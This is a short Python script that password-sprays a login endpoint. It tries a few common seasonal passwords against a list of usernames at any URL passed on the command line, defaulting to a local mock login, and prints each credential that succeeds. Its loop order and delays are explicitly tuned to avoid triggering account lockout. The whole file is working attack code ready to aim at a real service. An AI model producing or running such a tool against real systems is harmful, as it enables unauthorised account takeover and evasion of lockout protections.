import time, sys, requests
USERS = ["alice","bob","carol"]
PASSWORDS = ["Summer2025!","Winter2024!","Password123!"]
def try_login(url, user, pwd):
    try:
        r = requests.post(url, json={"username":user, "password":pwd}, timeout=5)
        if r.status_code == 200 and "success" in r.text.lower():
            print(f"[HIT] {user}:{pwd}")
            return True
    except Exception as e:
        print("req error:", e)
    return False
if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv)>1 else "http://localhost:5000/mock-login"
    for pwd in PASSWORDS:
        for u in USERS:
            if try_login(url, u, pwd): 
                pass
            time.sleep(1.5)  # lockout-friendly spacing
